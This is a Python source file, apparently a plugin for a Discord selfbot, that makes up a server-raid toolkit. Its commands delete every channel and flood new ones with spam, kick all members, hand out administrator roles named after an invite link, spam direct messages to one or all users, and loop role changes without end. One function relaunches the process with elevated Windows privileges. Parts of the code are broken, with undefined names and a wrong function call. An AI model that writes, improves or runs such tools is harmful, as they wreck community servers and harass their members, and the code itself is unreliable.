import requests
import asyncio
import time
import os
import discord.ext
import discord

def raidserver(self):
    windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    os.kill(os.getpid(), SIGTERM)

vymancer = ui.new_tab(
    ref="vymancer_ui",
    title="Vymancer",
    description="This is Vymancer added to Nighty",
    icon="https://cdn.discordapp.com/attachments/1231055835472597028/1235674858566975641/7c0d2aeaa9d04c364ddf1b8862a35ee6.png"
)



@bot.command()
async def grantalladmin(ctx):
    await ctx.message.delete()
    role_name = "Fanted"
    
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role:
        await ctx.send(f"The '{role_name}' role already exists.")
    else:
       
        permissions = discord.Permissions(administrator=True) 
        role = await ctx.guild.create_role(name=role_name, permissions=permissions, color=discord.Color.purple())
        await ctx.send(f"The '{role_name}' role has been created successfully with blue color.")

    if discord.Permissions(administrator=False):
        await giveselfadmin()
    
    for member in ctx.guild.members:
        try:
            await member.add_roles(role)
        except discord.Forbidden:
            await ctx.send(f"Could not grant the '{role_name}' role to {member.display_name}.")

    await ctx.send(f"The '{role_name}' role has been granted to all members.")

@bot.command()
async def rickroll(ctx):
    """Deletes all channels, creates 10 new channels, and sends 3 Rickroll GIFs in each channel."""
    await ctx.message.delete()
    guild = ctx.guild

    for channel in guild.channels:
        await channel.delete()

    num_channels = 10
    for i in range(num_channels):
        new_channel = await guild.create_text_channel(f'rickroll-{i+1}')
        for _ in range(3):
            await new_channel.send("https://tenor.com/view/rickroll-roll-rick-never-gonna-give-you-up-never-gonna-gif-22954713")

@bot.command()
async def createroles(ctx):
    """Creates 10 roles with our invite link and grants them Admin perms."""
    await ctx.message.delete()
    for _ in range(10):
      
        color = discord.Color(random.randint(0, 0xFFFFFF))
        role = await ctx.guild.create_role(name=".gg/kFrdtSQC7m", color=color)
        await role.edit(permissions=discord.Permissions(administrator=True))
    await ctx.send("10 roles named '.gg/kFrdtSQC7m' with random colors and administrator permissions have been created.")

@bot.command()
async def rickrolltarget(ctx, user: discord.User):
    """Rickroll anyone u want thats in the server"""
    await ctx.message.delete()
    if not ctx.author.guild_permissions.manage_messages:
        await ctx.send("You don't have permission to manage messages.")
        return
    
    rickroll_url = "https://tenor.com/view/rickroll-roll-rick-never-gonna-give-you-up-never-gonna-gif-22954713"
    
    try:
        for _ in range(5):
            await user.send(f"{rickroll_url}")
        await ctx.send(f"Rickrolled {user.mention} successfully!")
    except discord.Forbidden:
        await ctx.send("I couldn't send a DM to that user.")


@bot.command()
async def vyspam(ctx, count: int, *, message: str):
    await ctx.message.delete()
    sends = 0
    for i in range(count):
        sends += 1
        try:
            await ctx.send(message)
        except discord.HTTPException as e:
            if e.status == 429:
                await ctx.send("403 Nuh Uh")

@bot.command()
async def rainbow(ctx):
    await ctx.message.delete()
    rainbow_colors = [
        discord.Color.red(),
        discord.Color.orange(),
        discord.Color.gold(),
        discord.Color.green(),
        discord.Color.blue(),
        discord.Color.dark_teal(),
        discord.Color.purple(),
        discord.Color.teal(),
        discord.Color.magenta(),
        discord.Color.dark_red()
    ]
    rainbow_roles = []
    for i, color in enumerate(rainbow_colors, start=1):
        role = await ctx.guild.create_role(name=f"Raged{i}", color=color)
        rainbow_roles.append(role)
    try:
        for member in ctx.guild.members:
            for role in rainbow_roles:
                await member.add_roles(role)

            for role in rainbow_roles:
                await member.remove_roles(role)

            while True:
                for role in rainbow_roles:
                    await member.add_roles(role)
                for role in rainbow_roles:
                    await member.remove_roles(role)
    
    except discord.Forbidden:
        await ctx.send("I don't have the perms")
        
@bot.command()
async def changechannels(ctx, *, new_name):
    await ctx.message.delete()
    """Change the name of all channels in the server."""
    await nighty.message.delete()
    try:

        for channel in ctx.guild.channels:
            if isinstance(channel, discord.TextChannel):
                await channel.edit(name=new_name)
        await ctx.send(f'All channel names changed to `{new_name}` successfully.')
    except discord.Forbidden:
        await ctx.send("I don't have permission to edit channel names.")
    except discord.HTTPException:
        await ctx.send("Failed to change channel names.")

@bot.command()
async def grantadmin(ctx, member: discord.Member):
    """Grants a Specific User Admin Perms"""
    await ctx.message.delete()
    role_name = ".gg/kFrdtSQC7m"
    
    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role:
        await ctx.send(f"The '{role_name}' role already exists.")
    else:

        permissions = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=role_name, permissions=permissions, color=discord.Color.blue())
        await ctx.send(f"The '{role_name}' role has been created successfully with blue color.")

    try:
        await member.add_roles(role)
        await ctx.send(f"The '{role_name}' role has been granted to {member.display_name}.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to manage roles.")

@bot.command()
async def giveselfadmin(ctx):
    """Gives admin permissions to the command invoker."""
    await ctx.message.delete()
    role_name = "Admin"  
    invoker = ctx.author 

    role = discord.utils.get(ctx.guild.roles, name=role_name)
    if role is None:
        permissions = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=role_name, permissions=permissions)
        await ctx.send(f"The '{role_name}' role has been created and granted to {invoker.display_name}.")
    else:
        if role in invoker.roles:
            await ctx.send(f"You already have the '{role_name}' role.")
        else:
            await invoker.add_roles(role)
            await ctx.send(f"The '{role_name}' role has been granted to {invoker.display_name}.")

@bot.command()
async def changechannel(ctx, channel: discord.TextChannel, *, new_name):
    """Change the name of a specific channel."""
    await ctx.message.delete()
    try:
        await channel.edit(name=new_name)
        await ctx.send(f'Channel name changed to `{new_name}` successfully.')
    except discord.Forbidden:
        await ctx.send("I don't have permission to edit this channel's name.")
    except discord.HTTPException:
        await ctx.send("Failed to change the channel's name.")

@bot.command()
async def kickall(ctx):
    """Kicks all members from the server."""
    await ctx.message.delete()
    guild = ctx.guild
    for member in guild.members:
        try:
            if member.bot or member == guild.owner:
                continue
            
            await member.kick()
            await ctx.send(f"Kicked {member.display_name}.")
        except discord.Forbidden:
            await ctx.send(f"Could not kick {member.display_name}.")
        except Exception as e:
            await ctx.send(f"An error occurred while kicking {member.display_name}: {e}")

@bot.command()
async def spamdms(ctx, user: discord.User, times: int, *, message_to_spam):
    """Spams a user's DMs."""
    await ctx.message.delete()
    for _ in range(times):
        await user.send(message_to_spam)
        

@bot.command()
async def nickname(ctx, member: discord.Member, *, new_nickname):
    """Changes the nickname of a specified member."""
    await ctx.message.delete()
    try:
        await member.edit(nick=new_nickname)
        await ctx.send(f"The nickname of {member.display_name} has been changed to '{new_nickname}'.")
    except discord.Forbidden:
        await ctx.send("I don't have permission to change the nickname.")



@bot.command()
async def massreact(ctx):
    """Massive Reactions to a Specific Message by replying to it"""
    await ctx.message.delete()
    if ctx.message.reference and ctx.message.reference.resolved:
        replied_message = ctx.message.reference.resolved
        reactions = ['😭', '🤔', '😎', '🙄', '😡', '🤥', '🥹', '🥶', '🔫', '😈', '💩', '💀', '💎', '🤑', '🤬', '😭', '🤔', '😎', '🙄', '😡', '🤥', '🥹', '🥶', '🔫', '🖕', '🇱']
        
        for reaction in reactions:
            await replied_message.add_reaction(reaction)
        await ctx.send("Reactions added successfully.")
    else:
        await ctx.send("Please reply to the message you want to add reactions to and then use the `.massreact` command.")

@bot.command()
async def massreactall(ctx, channel: discord.TextChannel):
    """Massive Reactions to all messages in a Specific Channel"""
    await ctx.message.delete()
    target_channel = channel

    async for message in target_channel.history(limit=None):
        reactions = ['😭', '🤔', '😎', '🙄', '😡', '🤥', '🥹', '🥶', '🔫', '😈', '💩', '💀', '💎', '🤑', '🤬', '😭', '🤔', '😎', '🙄', '😡', '🤥', '🥹', '🥶', '🔫', '🖕', '🇱']

        for reaction in reactions:
            await message.add_reaction(reaction)

@bot.command()
async def rainbowall(ctx, member: discord.Member):
    await ctx.message.delete()
    rainbow_colors = [
        discord.Color.red(),
        discord.Color.orange(),
        discord.Color.gold(),
        discord.Color.green(),
        discord.Color.blue(),
        discord.Color.dark_teal(),
        discord.Color.purple(),
        discord.Color.teal(),
        discord.Color.magenta(),
        discord.Color.dark_red()
    ]
    rainbow_roles = []
    for i, color in enumerate(rainbow_colors, start=1):
        role = await ctx.guild.create_role(name=f"Raged{i}", color=color)
        rainbow_roles.append(role)
    try:
        for role in rainbow_roles:
            await member.add_roles(role)

        for role in rainbow_roles:
            await member.remove_roles(role)

        while True:
            for role in rainbow_roles:
                await member.add_roles(role)
            for role in rainbow_roles:
                await member.remove_roles(role)
    
    except discord.Forbidden:
        await ctx.send("I dont have the perms")

@bot.command()
async def dmall(ctx, *, message):
    """DMs everyone what you want to say"""
    await ctx.message.delete()
    if not ctx.author.guild_permissions.send_messages:
        await ctx.send("You don't have permission to send messages.")
        return
    for member in ctx.guild.members:
        try:
            await member.send(message)
        except discord.Forbidden:
            continue
        except Exception as e:
            print(f"Failed to DM {member}: {e}")
            
ui.create_tab(vymancer)    